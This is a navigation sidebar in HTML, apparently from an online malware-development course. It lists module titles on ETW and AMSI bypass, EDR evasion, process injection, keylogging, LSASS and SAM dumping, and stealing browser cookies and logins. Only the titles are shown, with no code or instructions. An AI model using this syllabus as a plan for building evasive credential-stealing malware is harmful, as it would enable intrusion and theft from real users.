                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./80.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
